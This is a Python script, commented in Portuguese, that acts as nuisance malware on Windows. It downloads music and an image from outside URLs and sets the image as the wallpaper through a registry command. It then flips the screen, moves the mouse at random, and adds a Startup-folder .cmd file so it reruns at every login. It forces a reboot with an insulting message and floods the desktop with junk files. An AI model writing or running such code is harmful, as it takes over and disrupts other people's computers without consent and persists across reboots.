#importa bibliotecas que nescessitam de serem baixadas 
from pyautogui import moveTo,hotkey,leftClick,press
from random import choice,randint
from requests import get, status_codes, codes
from getpass import getuser
from time import sleep

#bibliotecas que sao padreos do python
from pathlib import Path
from os import system



#nome do usuario logado 
user_name = getuser()

#local da imagem do wallpaper
local_path_download_image = f"c:\\users\\{user_name}\\wallpaper_windows_10.bmp"

#local do arquivo que inicia com o windows
local_path_download_exe = f"c:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init_app.cmd"

#local da musica a ser tocada
musica_m4_matue = f"c:\\users\\{user_name}\\music_windows.mp3"

#declara o caminho do arquivo para a verificacao da existencia do mesmo
fileObj_wpp = Path(local_path_download_image)

#declara o caminho do arquivo para a verificacao de existencia do mesmo 
fileObj_init_app = Path(local_path_download_exe)

#verifica se o arquivo existe
if fileObj_wpp.is_file() == False:
    
    #funcao para baixar os arquivos caso eles nao existam
    def download_file(url, path_to_save):
        response_url = get(url)
        if response_url.status_code == codes.OK:
            with open (path_to_save, 'wb') as wallpaper_windows_10:
                wallpaper_windows_10.write(response_url.content)
            return response_url
        else:
            response_url.raise_for_status()
    #baixa os arquivos 
    download_file('https://fl12.flvto.com.mx/sb/u1/0yngw7IHPWRc2fyTIF4eZA,1642630541/yt:cMTrUCasbss-1/Teto%20-%20M4%20feat.%20Matu%C3%AA.mp3',musica_m4_matue)
    download_file('https://s182.convertio.me/p/Jbrc99weVUp_Y1kJMeP1vA/11822097d49c8acf7fc82e215df87957/thumb-1920-1028689.bmp',local_path_download_image)
    
    sleep(16)
    #define o wallpaper
    system(f'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d {local_path_download_image} /f')
else:
    #caso o arquivo ja exita ele apenas passa para o proximo bloco de codigo
    pass

#comeca a musica
system(f'start {musica_m4_matue}')

#vai para a area de trabalho
hotkey('win', 'd')

#atualiza e clica na area de trabalho
press("f5",presses=2)
leftClick(x=16,y=16)

#cria uma nova area de trabalho
hotkey('ctrl', 'win', 'd')

#atualiza e clica na area de trabalho
leftClick(x=16,y=16)
press("f5",presses=2)

#cria uma nova area de trabalho
hotkey('ctrl', 'win', 'd')

#atualiza e clica na area de trabalho
press("f5",presses=2)
leftClick(x=16,y=16)

for i in range(0, 26):
    #escolhe para que lado a tela vai virar
    key_choice = choice(["down", "up", "left", "right"])
    hotkey('ctrl','alt',f"{key_choice}")
    #escolhe coordenadas aleatorais para o mouse se mover dentro de um tempo que tambem e aleatorio
    cord_x = randint(1, 1365)
    cord_y = randint(1, 767)
    time_to_move = randint(1, 10)
    moveTo(x=cord_x, y=cord_y, duration=time_to_move)
    #move a tela novamente
    if i != 1 or 4 or 7:
        key_choice = choice(["down", "up", "left", "right"])
        hotkey('ctrl','alt',f"{key_choice}")


#se o arquivo nao estiver ja criado o codigo vai ser executado
if fileObj_init_app.is_file() == False:
    #escreve no arquivo
    with open(local_path_download_exe,'w') as cmd_startup:
        cmd_startup.writelines(f"@echo off\npython C:\\users\\{user_name}\\main_WindowsBased_App_86x.py")
        cmd_startup.close()
    
    #%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
    system('shutdown /r /t 30 /c "You are so dumb"')

for i in range (0, 30):
    #escolhe um nome aleatorio para um arquivo
    nome = choice(['asdf', 'shdjd', 'grbhu', 'siodgyfuy', 'iksgudfiugy', 'diugrtjtukfgi', 'agdfyuiyiyisa', 'dsfiyudtgysfaegi', 'dsftyikdsyasdgfhjdsrtgi', 'ds29387UYYfgi', 'dsSGA638972NTJfgi', 'dsffUFTIUUGRIPuggi', 'dsgadeehfounaygiauwyfgi', 'dsfGJTULKDTYUDSFGahdfghgi', 'dsdgkljyaraerRTDSTUfgi'])
    
    #escolhe uma extensao aleatoria para um arquivo
    extensao = choice(['.pdf', '.txt', '.doc', '.xls','.html', '.cpp', '.c', '.php', '.phtml', '.rb', '.py', '.xhtml', '.xml', '.css', '.js', '.java', '.p', '.o', '.cmd', '.bat', '.exe', '.dll', '.sys', '.zip', '.rar', '.tar', '.gz', '.png', '.jpg'])
    
    #cria o arquivo com o resultado das duas variaveis a cima 
    system(f'NUL > c:\\users\\{user_name}\\desktop\\{nome}{extensao}')
    